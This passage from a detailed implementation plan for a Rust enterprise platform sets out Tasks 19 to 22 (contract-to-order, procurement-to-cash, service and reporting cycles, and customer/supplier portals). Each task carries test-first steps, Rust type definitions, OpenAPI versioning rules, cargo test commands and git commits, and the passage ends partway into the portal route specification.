- Produces: typed customer/opportunity/quote/contract/order commands and facts, customer 360 projections and a durable contract-fulfilment objective.

- [ ] **Step 1: Write the failing end-to-end invariant test**

```rust
#[tokio::test]
async fn activating_contract_once_creates_exactly_one_order_and_obligation_graph() {
    let quote = create_approved_quote().await;
    let contract = create_signed_contract_from(quote).await;
    let first = activate_contract(contract.id, "activate-1").await.unwrap();
    let second = activate_contract(contract.id, "activate-1").await.unwrap();
    assert_eq!(first.sales_order_id, second.sales_order_id);
    assert_eq!(count_orders_for_contract(contract.id).await, 1);
    assert_eq!(open_obligations(contract.id).await.kinds(), ["fulfil-sales-order"]);
}
```

- [ ] **Step 2: Confirm the vertical slice fails**

Run: `cargo xtask f57check --task F57-19 --phase pre-red && cargo test -p ep-testkit --test f57_customer_contract_order`

Expected: FAIL because the persistence ports exist but the customer→contract→order handlers and command registrations do not.

- [ ] **Step 3: Implement the typed command/fact boundary**

```rust
pub enum ContractCommand {
    CreateDraft(CreateContract),
    Submit { contract_id: ContractId, expected_version: u64 },
    Approve { contract_id: ContractId, reauth_proof: ReauthProof },
    RecordSignature { contract_id: ContractId, evidence: SignatureEvidence },
    Activate { contract_id: ContractId, idempotency_key: String },
    Change { contract_id: ContractId, base_version: u64, change: ContractChange },
    Terminate { contract_id: ContractId, reason: TerminationReason },
}

pub enum ContractFact { Drafted, Submitted, Approved, Signed, Activated, Changed, TerminationRequested, Terminated }
```

Implement unique numbering, snapshots, duplicate-customer merge audit, opportunity → quote → contract/order provenance, multi-chain approval, payment schedule and attachment evidence. Implement the Business §2 exact `PlannedFollowUp` graph: `PLANNED→COMPLETED|CANCELLED|OVERDUE`、`OVERDUE→COMPLETED|CANCELLED|PLANNED` with COMPLETED/CANCELLED terminal and every unlisted edge rejected. Completion atomically appends exactly one immutable FollowUp；overdue reschedule appends old/new due/reason/approval evidence and returns PLANNED without erasing overdue history. `t_f57_crm_003` executes every edge, terminal/unlisted negatives, trusted-time overdue, completion exact-one, overdue cancellation and reschedule history.

Freeze the public/database closed enum as `SalesOrderSourceKind = CONTRACT_VERSION | QUOTE_VERSION | MANUAL_AUTHORITY`; Rust variants may be `ContractVersion | QuoteVersion | ManualAuthority` only when serde/sqlx explicitly rename them to those exact wire/database tokens. The three optional source references obey database exact-one. `MANUAL_AUTHORITY` requires reason, price/tax/credit approval and immutable commercial snapshot；`ManualSnapshot` is not a fourth kind or alias. A quote version chooses exactly one commitment route: direct order or contract then activation; the second route is rejected so contract activation cannot create a duplicate order. `STANDARD` is the sole current spelling；legacy `NORMAL` is migration input only. Contract changes affect only unfulfilled obligations；termination remains open until the impact-disposition checklist closes.

In the same change, append exactly the 56 `EMPLOYEE/COMMAND` and 22 `EMPLOYEE/QUERY` seed rows whose `owner_task=F57-19` and `introduced_version=1.1.0-f57` to the existing fixed `/employee/v1/commands` and `/employee/v1/queries` IDL, without adding a path. The cumulative Employee 1.1 slice is exactly `63/28`; bump `employee-api.v1.yaml` from `1.0.0-f57` to `1.1.0-f57`, set `x-planned-implementation-tasks` exactly to `[F57-18,F57-19]`, and atomically update its machine row in `docs/openapi/README.md` plus the semantic authority row. Every introduced branch is tagged `x-f57-owner-task: F57-19`; OpenAPI payload/result/error `$ref`, CAS and audience extensions, `apps/core-server/src/platform/employee_api.rs` Task 6 registration and the Workbench-generated TypeScript union must equal the cumulative seed slice field-for-field. Missing、extra、future-owner、duplicated owner、stale version、unimplemented variant、one-sided schema or direct business route fails `f57_workbench_contract`；there is no default/generic dispatcher.

Execute the complete Business §2/§3 Opportunity and QuoteVersion matrices: every listed edge has a positive named case, every unlisted edge and every terminal mutation has a negative case, and issue timeout/Unknown, expiry-vs-acceptance boundary, immutable commercial content, supersession, rejection/withdrawal and the exact-one direct-order-or-contract conversion root are exercised across process restart and concurrent CAS. A happy-path conversion alone is not Task 19 completion.

- [ ] **Step 4: Freeze sales-type scope in code and tests**

```rust
#[test]
fn certified_sales_types_are_standard_and_drop_ship_only() {
    assert_eq!(CertifiedSalesType::ALL, [CertifiedSalesType::Standard, CertifiedSalesType::DropShip]);
    assert_eq!(SalesType::Consignment.availability(), Availability::DeferredProvider);
    assert_eq!(SalesType::Subscription.availability(), Availability::DeferredProvider);
    assert_eq!(SalesType::Lease.availability(), Availability::DeferredProvider);
}
```

This task proves Standard and Drop-ship type admission, pricing/credit and customer→quote→contract→order provenance only. Task 20 certifies delivery/return/invoice/cash for both types, and Task 21 certifies service closure. Consignment, subscription and lease retain typed provider seams but are not advertised as certified current workflows.

- [ ] **Step 5: Run domain, RLS, idempotency and fault tests**

Run: `cargo test -p ep-domain-mdm -p ep-domain-crm -p ep-domain-cpq -p ep-domain-clm -p ep-domain-sales -p core-server && cargo test -p ep-testkit --test f57_customer_contract_order --test f57_workbench_contract && cargo xtask f57check --task F57-19 --phase post-green`

Expected: PASS for the complete PlannedFollowUp/FollowUp state-history matrix, all three order sources, route XOR, duplicate commands, stale versions, cross-legal-entity reads, price/credit race, immutable snapshots, contract change and order-obligation reopen；no downstream delivery/invoice/cash/service claim is made yet.

- [ ] **Step 6: Commit**

```bash
git add -- crates/contract/mdm/src/lib.rs crates/domain/mdm/src/lib.rs crates/application/mdm/src/lib.rs crates/contract/crm/src/lib.rs crates/domain/crm/src/lib.rs crates/application/crm/src/lib.rs
git add -- crates/contract/cpq/src/lib.rs crates/domain/cpq/src/lib.rs crates/application/cpq/src/lib.rs crates/contract/clm/src/lib.rs crates/domain/clm/src/lib.rs crates/application/clm/src/lib.rs
git add -- crates/contract/sales/src/lib.rs crates/domain/sales/src/lib.rs crates/application/sales/src/lib.rs apps/core-server/src/business.rs apps/core-server/src/wiring/business.rs apps/core-server/src/lib.rs
git add -- apps/core-server/src/wiring/mod.rs apps/core-server/src/wiring/command.rs apps/core-server/src/platform/employee_api.rs clients/workbench/src/api/employee.ts apps/core-server/Cargo.toml testkit/tests/f57_customer_contract_order.rs testkit/tests/f57_workbench_contract.rs testkit/Cargo.toml
git add -- docs/openapi/employee-api.v1.yaml docs/openapi/README.md docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md
git commit -m "feat: close customer contract and order loop"
```

### Task 20: Deliver procurement, both certified sales types, inventory and operating-finance closure

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-business-execution-contract.md`
- Existing authoritative input: `docs/f57-api-discriminators.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-shapes.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-direct-routes.seed.tsv`
- Modify: `docs/openapi/employee-api.v1.yaml`
- Modify: `docs/openapi/finance.v1.yaml`
- Modify: `docs/openapi/invoice.v1.yaml`
- Modify: `docs/openapi/ledger.v1.yaml`
- Modify: `docs/openapi/README.md`
- Modify: `docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md`
- Modify: `crates/contract/procure/src/lib.rs`
- Modify: `crates/domain/procure/src/lib.rs`
- Modify: `crates/application/procure/src/lib.rs`
- Modify: `crates/contract/inventory/src/lib.rs`
- Modify: `crates/domain/inventory/src/lib.rs`
- Modify: `crates/application/inventory/src/lib.rs`
- Modify: `crates/contract/costing/src/lib.rs`
- Modify: `crates/domain/costing/src/lib.rs`
- Modify: `crates/application/costing/src/lib.rs`
- Modify: `crates/contract/invoice/src/lib.rs`
- Modify: `crates/domain/invoice/src/lib.rs`
- Modify: `crates/application/invoice/src/lib.rs`
- Modify: `crates/contract/finance/src/lib.rs`
- Modify: `crates/domain/finance/src/lib.rs`
- Modify: `crates/application/finance/src/lib.rs`
- Modify: `crates/contract/ledger/src/lib.rs`
- Modify: `crates/domain/ledger/src/lib.rs`
- Modify: `crates/application/ledger/src/lib.rs`
- Modify: `apps/core-server/src/business.rs`
- Modify: `apps/core-server/src/wiring/business.rs`
- Modify: `apps/core-server/src/platform/employee_api.rs`
- Modify: `clients/workbench/src/api/employee.ts`
- Modify: `apps/core-server/Cargo.toml`
- Create: `testkit/tests/f57_procure_inventory_cash.rs`
- Modify: `testkit/tests/f57_workbench_contract.rs`
- Modify: `testkit/Cargo.toml`
- Test manifest: every row whose `activation_task=F57-20`, including the exact SAL/PROC/INV/FIN rows and deferred-boundary rows `DEF-002`、`DEF-003`、`DEF-009`, plus retained F-50 invariants

**Interfaces:**
- Consumes: Task 4 persistence, Task 12 obligations, Task 19 order demands, retained F-50 financial invariants and the immutable API discriminator/component/state/direct-route authorities.
- Produces: procurement-demand, RFQ/quote/award, purchase order, receipt/return, immutable inventory/value events, invoice, AR/AP, receipt/payment/refund/reversal and operating-ledger facts.

- [ ] **Step 1: Write the failing economic-conservation test**

```rust
#[tokio::test]
async fn order_to_receipt_to_invoice_to_cash_reconciles_without_duplicate_effects() {
    for sales_type in [SalesType::Standard, SalesType::DropShip] {
        let run = execute_certified_sale(sales_type).await.unwrap();
        assert_eq!(run.inventory_quantity_ledger, run.inventory_on_hand);
        assert_eq!(run.inventory_value_ledger, run.cost_entries_total);
        assert_eq!(run.invoice_gross, run.receivable_open + run.receipts_allocated - run.refunds);
        assert_eq!(run.unbalanced_operating_journal_entries, 0);
        assert_eq!(run.duplicate_external_effects, 0);
    }
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-20 --phase pre-red && cargo test -p ep-testkit --test f57_procure_inventory_cash`

Expected: FAIL because persistence exists but procurement/inventory/finance closure handlers are not registered.

- [ ] **Step 3: Implement demand, stock and cash facts**

```rust
#[derive(sqlx::Type, serde::Serialize, serde::Deserialize)]
pub enum ProcurementDemandSourceKind {
    #[sqlx(rename = "CONTRACT")] #[serde(rename = "CONTRACT")] Contract,
    #[sqlx(rename = "SALES_ORDER")] #[serde(rename = "SALES_ORDER")] SalesOrder,
    #[sqlx(rename = "PROJECT")] #[serde(rename = "PROJECT")] Project,
    #[sqlx(rename = "INVENTORY_RULE")] #[serde(rename = "INVENTORY_RULE")] InventoryRule,
    #[sqlx(rename = "MANUAL_REQUEST")] #[serde(rename = "MANUAL_REQUEST")] ManualRequest,
    #[sqlx(rename = "EXTERNAL_PRODUCTION")] #[serde(rename = "EXTERNAL_PRODUCTION")] ExternalProduction,
}
pub enum InventoryFact { Received, Issued, SalesReturned, PurchaseReturned, ValueAdjusted }
pub enum CashFact { ReceiptRecorded, PaymentRecorded, AllocationApplied, RefundRecorded, ReversalRecorded }
```

No `Reorder`、`Manual` or `EXTERNAL_PRODUCTION_PROVIDER` wire/database alias is accepted；those are former/display-language shorthands only. The sixth exact wire/database token is `EXTERNAL_PRODUCTION` and the Rust variant is `ExternalProduction`, matching Business Execution Contract §5.1. Payload exact-one reference rules and failure semantics come directly from that section.

Every demand has exactly one of six sources—contract, sales order, project, reorder/inventory, approved manual or idempotent external-production request—and retains source type/version/quantity. Merge/split and partial ordering conserve per-source and total quantity. Implement the current RFQ/supplier-quote/award state machines, quote versions/withdrawal/expiry, no-quote/single-quote/tie/exception decisions and partial/multi-supplier allocation/re-award under SoD. This is ordinary sourcing, not the deferred regulated tender/bid-opening/guarantee/evaluation-committee capability. Customer quotes and supplier quotes use distinct objects, events and stable error namespaces. Inventory forbids negative available quantity and duplicate movements. Invoice and cash use F-50 many-to-many allocation, advances, partial red/blue corrections, refunds, unknown reconciliation and immutable correction chains.

In the same Task 20 change, rebaseline `finance.v1.yaml`、`invoice.v1.yaml` and `ledger.v1.yaml` from historical/current-subject input into implemented F-57 schema-component contracts. Their exact titles/versions are respectively `Enterprise Platform Finance Component Contract`、`Enterprise Platform Invoice Component Contract`、`Enterprise Platform Ledger Component Contract`, each at `1.0.0-f57`；each declares `x-f57-status: CURRENT`、`x-source-authority: F57_TASK_20`、`x-planned-implementation-tasks: [F57-20]`、`x-implementation-state: IMPLEMENTED` and `x-contract-kind: SCHEMA_COMPONENTS_ONLY`. They contain the strict reusable Task 20 command/query/result/error component schemas with `additionalProperties:false` and exact stable tokens, but `paths: {}` and no `servers` listener: Workbench calls only the employee API and there is no direct `/api/v1/finance|invoice|ledger/*` client surface. A path, listener, free journal, arbitrary account, direct database or unregistered effect endpoint is a contract failure.

Append exactly the 95 `EMPLOYEE/COMMAND` plus 42 `EMPLOYEE/QUERY` seed rows whose `owner_task=F57-20` and `introduced_version=1.2.0-f57` to the existing employee command/query routes. The cumulative Employee 1.2 slice is exactly `158/70`; bump `employee-api.v1.yaml` from `1.1.0-f57` to `1.2.0-f57` and set `x-planned-implementation-tasks` exactly to `[F57-18,F57-19,F57-20]`. Every introduced branch has `x-f57-owner-task: F57-20` and exact seed payload/result/error `$ref`, CAS and audience. Atomically update all four machine rows in `docs/openapi/README.md` and the semantic authority entries；Task 25 validates and never silently repairs them. OpenAPI, `apps/core-server/src/platform/employee_api.rs` Task 6 registrations and the generated Workbench TypeScript union must exact-equal the cumulative seed slice；`f57_workbench_contract` rejects a direct component-booklet route, missing/extra/future-owner row, stale version, unknown/default discriminator, schema mismatch or one-sided registry activation.

The Task 20 state-machine suite enumerates every allowed edge, every unlisted edge and every terminal mutation for `ProcurementDemand`、`RFQRound` and `SupplierQuoteVersion`, across fresh PostgreSQL, restart and concurrent CAS. It specifically proves that `StartSourcing` on PARTIALLY_AWARDED opens a new round while the derived Demand state remains PARTIALLY_AWARDED；only loss of every effective award may return it to READY. It also proves quantity conservation on every merge/split/partial award/re-award, late/superseded/selected quote terminal immutability and award/PO rollback without rewriting quote history.

- [ ] **Step 4: Implement the exact operating-ledger boundary**

```rust
pub struct OperatingJournalEntry {
    pub entry_id: uuid::Uuid,
    pub legal_entity_id: uuid::Uuid,
    pub source_fact: FactRef,
    pub operational_period: YearMonth,
    pub lines: Vec<OperatingJournalLine>,
    pub correction_of: Option<uuid::Uuid>,
}

#[test]
fn operating_ledger_is_balanced_but_not_advertised_as_statutory_books() {
    let capabilities = ledger_capabilities();
    assert!(capabilities.contains("balanced_operating_journal"));
    assert!(capabilities.contains("trial_balance_and_operational_period_lock"));
    assert!(!capabilities.contains("statutory_tax_ledger"));
    assert!(!capabilities.contains("payroll"));
    assert!(!capabilities.contains("statutory_year_end"));
}
```

The platform includes a controlled operating account mapping, balanced double-entry operating journal, trial balance, subledger reconciliation and permanent operating-period lock. There is no reopen command. Late facts retain their business date, post to the next open period and carry forwarding reason/correction links. It does not claim jurisdictional statutory chart, statutory voucher books, tax filing, payroll or statutory year-end; those use typed connectors and reconciliation evidence.

- [ ] **Step 5: Run financial, concurrency and reconciliation gates**

Run: `cargo test -p ep-domain-procure -p ep-domain-inventory -p ep-domain-costing -p ep-domain-invoice -p ep-domain-finance -p ep-domain-ledger -p core-server && cargo test -p ep-testkit --test f57_procure_inventory_cash --test f57_workbench_contract && cargo xtask f57check --task F57-20 --phase post-green`

Expected: PASS for the six-source procurement matrix, merge/split/partial award conservation, RFQ edge cases, Standard and Drop-ship delivery/return/exchange/invoice/cash, partial/over/short/refused receipt, serialized stock, price variance, multi-tax invoice, advances, multi-allocation, reversal, unknown bank outcome, permanent period lock/late forwarding and statutory-connector outage.

- [ ] **Step 6: Commit**

```bash
git add -- crates/contract/procure/src/lib.rs crates/domain/procure/src/lib.rs crates/application/procure/src/lib.rs crates/contract/inventory/src/lib.rs crates/domain/inventory/src/lib.rs crates/application/inventory/src/lib.rs
git add -- crates/contract/costing/src/lib.rs crates/domain/costing/src/lib.rs crates/application/costing/src/lib.rs crates/contract/invoice/src/lib.rs crates/domain/invoice/src/lib.rs crates/application/invoice/src/lib.rs
git add -- crates/contract/finance/src/lib.rs crates/domain/finance/src/lib.rs crates/application/finance/src/lib.rs crates/contract/ledger/src/lib.rs crates/domain/ledger/src/lib.rs crates/application/ledger/src/lib.rs
git add -- docs/openapi/employee-api.v1.yaml docs/openapi/finance.v1.yaml docs/openapi/invoice.v1.yaml docs/openapi/ledger.v1.yaml docs/openapi/README.md docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md
git add -- apps/core-server/src/business.rs apps/core-server/src/wiring/business.rs apps/core-server/src/platform/employee_api.rs clients/workbench/src/api/employee.ts apps/core-server/Cargo.toml testkit/tests/f57_procure_inventory_cash.rs testkit/tests/f57_workbench_contract.rs testkit/Cargo.toml
git commit -m "feat: close procurement inventory and cash loop"
```

### Task 21: Deliver service, equipment, project and evidence-backed reporting cycles

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-business-execution-contract.md`
- Existing authoritative input: `docs/f57-api-discriminators.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-shapes.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-direct-routes.seed.tsv`
- Modify: `docs/openapi/employee-api.v1.yaml`
- Modify: `docs/openapi/README.md`
- Modify: `docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md`
- Modify: `crates/contract/service/src/lib.rs`
- Modify: `crates/domain/service/src/lib.rs`
- Modify: `crates/application/service/src/lib.rs`
- Modify: `crates/contract/project/src/lib.rs`
- Modify: `crates/domain/project/src/lib.rs`
- Modify: `crates/application/project/src/lib.rs`
- Modify: `crates/contract/reporting/src/lib.rs`
- Modify: `crates/domain/reporting/src/lib.rs`
- Modify: `crates/application/reporting/src/lib.rs`
- Modify: `apps/core-server/src/business.rs`
- Modify: `apps/core-server/src/wiring/business.rs`
- Modify: `apps/core-server/src/platform/employee_api.rs`
- Modify: `clients/workbench/src/api/employee.ts`
- Modify: `apps/core-server/Cargo.toml`
- Create: `testkit/tests/f57_service_project_cycle.rs`
- Create: `testkit/tests/f57_reporting_evidence.rs`
- Create: `testkit/tests/f57_service_project_reporting.rs`
- Modify: `testkit/tests/f57_workbench_contract.rs`
- Modify: `testkit/Cargo.toml`
- Test manifest: every row whose `activation_task=F57-21`, including the exact SRV/PRJ/REP rows and deferred-boundary row `DEF-005`

**Interfaces:**
- Consumes: Task 5 persistence, Task 12 obligations, Tasks 19–20 customer/contract/order/inventory/cost/cash facts and the immutable API discriminator/component/state/direct-route authorities.
- Produces: complaint/service request, equipment/serial, dispatch, work order, maintenance cycle, project milestone/risk and evidence-drilldown report contracts.

- [ ] **Step 1: Write failing service closure and reopen tests**

```rust
#[tokio::test]
async fn work_order_closes_only_with_all_obligations_and_customer_evidence() {
    let order = work_order().missing_customer_acceptance();
    assert_eq!(close(order).await.unwrap_err().code(), "SERVICE.WORK_ORDER.CLOSURE_EVIDENCE_MISSING");
    let closed = close(add_customer_signature(order)).await.unwrap();
    let closed_cycle_no = closed.cycle_no;
    post_return_of_used_part(closed.part_issue_id).await.unwrap();
    let current = load_work_order(closed.id).await;
    assert_eq!(current.state, WorkOrderState::InProgress);
    assert_eq!(current.cycle_no, closed_cycle_no + 1);
    assert_eq!(load_work_order_cycle(closed.id, closed_cycle_no).await.state, WorkOrderState::Closed);
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-21 --phase pre-red && cargo test -p ep-testkit --test f57_service_project_cycle`

Expected: FAIL because persistence exists but service/project/reporting cycle handlers are not registered.

- [ ] **Step 3: Implement service/project commands and evidence**

```rust
pub enum WorkOrderKind { Installation, Repair, Inspection, Maintenance, TechnicalSupport }
pub struct DispatchRequirement { pub capabilities: Vec<CapabilityId>, pub location: GeoArea, pub sla_due_at: DateTime<Utc>, pub sod_tags: Vec<String> }
pub struct WorkEvidence { pub timeline: Vec<TimelineItem>, pub attachments: Vec<FileRef>, pub parts: Vec<InventoryMovementRef>, pub labor_minutes: u32, pub customer_signature: Option<SignatureEvidence> }
```

Assignment resolves currently eligible people by capability, location, load, SLA and SoD; no fixed job title is required. A capability/relationship change re-resolves or escalates without silently broadening access. Complaint, request, five work-order kinds, service entitlement/warranty, maintenance-plan and per-cycle machines follow the business contract. Each work-order kind has its own closure evidence; customer signature is required only where that registered predicate says so. Unknown effects, open obligations, failed compensation or blocking incidents prevent closure. Recurrence, rejected acceptance, evidence withdrawal, part return and entitlement change use stable once-only reopen triggers: a `CLOSED` cycle stays immutable, the trigger appends the next `cycle_no`, and the current work order returns directly to `IN_PROGRESS`. There is no `REOPENED` state. Record part/labor cost, coverage, root cause, corrective action, recurrence, satisfaction and follow-up. Project, task, milestone and risk have separate states; project close resolves open milestones/risks/procurement/acceptance while finance remains owner of receipt facts. Full WBS/resource/EVM and recurring service billing remain deferred.

`PartUsageState` and wire/SQL values are exactly `REQUESTED|RESERVED|ISSUED|RETURNED|CONSUMED|SCRAPPED|CANCELLED` with only `REQUESTED→RESERVED|CANCELLED`、`RESERVED→ISSUED|CANCELLED`、`ISSUED→RETURNED|CONSUMED|SCRAPPED`；the four terminals are immutable. Return/consume/scrap each requires its distinct inventory movement/cost/evidence, mixed quantities split into source-conserving lines, and service never writes inventory directly. `t_f57_srv_006` in `f57_service_project_reporting.rs` must contain named cases `part_usage_every_allowed_edge_is_executable`、`part_usage_every_unlisted_edge_is_rejected`、`issued_scrap_is_not_consumed_or_cancelled` and `mixed_disposition_quantities_conserve_source`.

Append exactly the 69 `EMPLOYEE/COMMAND` plus 29 `EMPLOYEE/QUERY` seed rows whose `owner_task=F57-21` and `introduced_version=1.3.0-f57` to the unchanged employee route set. The cumulative Employee 1.3 slice is exactly `227/99`; bump `employee-api.v1.yaml` from `1.2.0-f57` to `1.3.0-f57`, set `x-planned-implementation-tasks` exactly to `[F57-18,F57-19,F57-20,F57-21]`, and atomically update its README machine row and authority semantic row. Every introduced branch has `x-f57-owner-task: F57-21` and exact seed payload/result/error `$ref`, CAS and audience. OpenAPI, generated Workbench TypeScript and `apps/core-server/src/platform/employee_api.rs` Task 6 registrations must exact-equal the cumulative seed slice；a stale version, missing/extra/future-owner row, schema mismatch, default dispatcher, implemented handler missing from IDL, IDL variant without a handler or direct service/project/report route fails `f57_workbench_contract`.

The Task 21 suite executes every Business §6 Complaint, WorkOrder and ProjectRisk allowed edge and rejects every unlisted edge and terminal mutation under domain plus FreshPG repository tests. Each transition exercises its exact evidence/obligation predicate, restart persistence, stale-version/concurrent-close races and the registered reopen trigger that creates a new cycle without rewriting a terminal cycle. The same exhaustive pattern applies to PartUsage; one happy service close or dashboard render cannot satisfy the task.

- [ ] **Step 4: Implement source-backed report definitions**

```rust
pub struct MetricResult {
    pub metric_id: MetricId,
    pub formula_version: u32,
    pub as_of: DateTime<Utc>,
    pub value: Decimal,
    pub evidence: Vec<FactRef>,
    pub generation: GenerationId,
}
```

Provide revenue, cost, margin, delivery, aging, procurement, inventory, service SLA, closure and automation-quality dashboards. Every aggregate exposes its formula and authorized drilldown; masked/hidden fields cannot be sorted, aggregated or inferred.

- [ ] **Step 5: Run cycle, report and authorization tests**

Run: `cargo test -p ep-domain-service -p ep-domain-project -p ep-domain-reporting -p core-server && cargo test -p ep-testkit --test f57_service_project_cycle --test f57_reporting_evidence --test f57_service_project_reporting --test f57_workbench_contract && cargo xtask f57check --task F57-21 --phase post-green`

Expected: PASS for the five-work-order × coverage × evidence/parts/labor × offline/portal × accept/reject/reopen matrix, auto-assignment, controlled reassignment, warranty/entitlement, recurring maintenance de-duplication, project milestone/risk close/reopen, metric registry/lineage reconciliation, field masking and single-heavy-report admission.

- [ ] **Step 6: Commit**

```bash
git add -- crates/contract/service/src/lib.rs crates/domain/service/src/lib.rs crates/application/service/src/lib.rs crates/contract/project/src/lib.rs crates/domain/project/src/lib.rs crates/application/project/src/lib.rs
git add -- crates/contract/reporting/src/lib.rs crates/domain/reporting/src/lib.rs crates/application/reporting/src/lib.rs apps/core-server/src/business.rs apps/core-server/src/wiring/business.rs apps/core-server/Cargo.toml
git add -- apps/core-server/src/platform/employee_api.rs clients/workbench/src/api/employee.ts docs/openapi/employee-api.v1.yaml docs/openapi/README.md docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md
git add -- testkit/tests/f57_service_project_cycle.rs testkit/tests/f57_reporting_evidence.rs testkit/tests/f57_service_project_reporting.rs testkit/tests/f57_workbench_contract.rs testkit/Cargo.toml
git commit -m "feat: close service project and reporting cycles"
```

### Task 22: Deliver customer/supplier portals and complete customization surfaces

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-business-execution-contract.md`
- Existing authoritative input: `docs/f57-api-discriminators.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-shapes.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-direct-routes.seed.tsv`
- Modify: `docs/openapi/portal.v1.yaml`
- Modify: `docs/openapi/README.md`
- Modify: `docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md`
- Modify: `crates/contract/portal/src/lib.rs`
- Modify: `crates/domain/portal/src/lib.rs`
- Modify: `crates/application/portal/src/lib.rs`
- Modify: `crates/platform/identity/src/portal_identity.rs`
- Modify: `crates/platform/identity/src/ports.rs`
- Modify: `crates/platform/identity/src/lib.rs`
- Modify: `crates/platform/identity/Cargo.toml`
- Modify: `crates/adapter/db-pg/src/portal/repository.rs`
- Modify: `crates/adapter/db-pg/src/portal/identity_repository.rs`
- Modify: `crates/adapter/db-pg/src/portal/portal_identity_repository.rs`
- Modify: `crates/adapter/db-pg/src/portal/mod.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `apps/core-server/src/platform/portal.rs`
- Modify: `apps/core-server/src/platform/mod.rs`
- Modify: `apps/core-server/src/business.rs`
- Modify: `apps/core-server/src/wiring/business.rs`
- Modify: `apps/core-server/src/wiring/command.rs`
- Modify: `apps/core-server/src/lib.rs`
- Modify: `apps/core-server/Cargo.toml`
- Modify: `apps/portal-gateway/src/main.rs`
- Modify: `apps/portal-gateway/src/session.rs`
- Modify: `apps/portal-gateway/src/upstream.rs`
- Create: `apps/portal-gateway/src/identity_lifecycle.rs`
- Modify: `apps/portal-gateway/Cargo.toml`
- Create: `clients/portal/package.json`
- Create: `clients/portal/package-lock.json`
- Create: `clients/portal/tsconfig.json`
- Create: `clients/portal/index.html`
- Create: `clients/portal/vite.config.ts`
- Create: `clients/portal/vitest.config.ts`
- Create: `clients/portal/src/main.tsx`
- Create: `clients/portal/src/test/setup.ts`
- Create: `clients/portal/src/App.test.tsx`
- Create: `clients/portal/src/App.tsx`
- Create: `clients/portal/src/api/portal.ts`
- Create: `clients/portal/src/customer/CustomerHome.tsx`
- Create: `clients/portal/src/supplier/SupplierHome.tsx`
- Create: `crates/platform/meta/src/ui_schema.rs`
- Create: `crates/platform/meta/src/dashboard.rs`
- Create: `crates/platform/meta/src/template.rs`
- Create: `crates/platform/meta/src/branding.rs`
- Modify: `crates/platform/meta/src/lib.rs`
- Modify: `crates/platform/meta/Cargo.toml`
- Create: `testkit/tests/f57_portal_isolation.rs`
- Create: `testkit/tests/f57_customization_generation.rs`
- Create: `testkit/tests/f57_branding_generation.rs`
- Create: `testkit/tests/f57_portal_customization.rs`
- Modify: `testkit/Cargo.toml`
- Test manifest: exact POR/CUS/GOV-006 rows owned by `F57-22`

**Interfaces:**
- Consumes: Tasks 5–6 persistence/commands, Tasks 8–10 authorization/generation/model compiler, Task 16 signed UI schema, Tasks 19–21 curated domain projections and the immutable API discriminator/component/state/direct-route authorities.
- Produces: customer and supplier portal command/query allowlists, custom form/list/menu/dashboard/print schema and generation-controlled publication.

- [ ] **Step 1: Write failing portal-isolation tests**

```rust
#[tokio::test]
async fn customer_portal_exposes_only_current_customers_curated_projection() {
    let session = customer_session("customer-a");
    assert!(query_order(&session, order_of("customer-a")).await.is_ok());
    assert_eq!(query_order(&session, order_of("customer-b")).await.unwrap_err().status(), 404);
    assert!(direct_core_route(&session, "/control/v1/generations").await.is_denied());
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-22 --phase pre-red && cargo test -p ep-testkit --test f57_portal_isolation`

Expected: FAIL because the customer portal and current allowlists are absent.

- [ ] **Step 3: Implement exact portal scope**

```rust
pub enum CustomerPortalCommand { ConfirmDelivery, SubmitAcceptance, CreateComplaint, CreateServiceRequest, AddServiceEvidence }
pub enum CustomerPortalQuery { Quote, Contract, Order, Delivery, Invoice, Receipt, Equipment, WorkOrder, ApprovedDocument }
pub enum SupplierPortalCommand { ConfirmPurchaseOrder, ConfirmDeliveryDate, SubmitAdvanceShippingNotice, UploadInvoice, UpdateOwnProfile }
pub enum SupplierPortalQuery { PurchaseOrder, ReconciliationStatement }
```

The customer portal cannot activate contracts, change money, approve payment, alter permissions or submit configuration. Supplier scope retains the five approved capabilities. Both use separate audience-bound identity/session keys, curated projections, rate limits and attachment quarantine; neither receives a core-server or database endpoint.

The only write path is `portal-gateway` fixed transport/BFF route → authenticated internal `core-server` portal adapter → the Task 6 `CommandPipeline` → typed portal application orchestration → the Task 5 identity and portal-identity authority ports sharing one caller-owned transaction. `PortalIdentityAuthorityPort` alone writes principal/authenticator/device/session/refresh facts；`PortalIdentityOrchestrationPort` alone writes invite/binding/fence/receipt facts；`PortalProjectionRepositoryPort` is read/projection-only. Their command-level coordinator invokes public owner methods, never another owner's SQL, and commits state, audit, outbox and command receipt once. `portal-gateway` is SQL-free and contains no repository implementation, domain state transition or generic upstream proxy; `identity_lifecycle.rs` only validates/normalizes the fixed HTTP envelope, cookie/CSRF/audience binding and maps stable errors. Queries use the fixed, audience-scoped projection port and reauthorize current principal/binding/party/contact/device/session/generation on every request. Architecture tests fail any gateway database dependency, owner-crossing table mutation, direct handler/repository call or route that bypasses the pipeline.

The complete portal HTTP contract is the following exact 19 method/path/operationId rows；no slash abbreviation is a path, and method、case、template name、尾斜杠与 operationId are byte-compared:

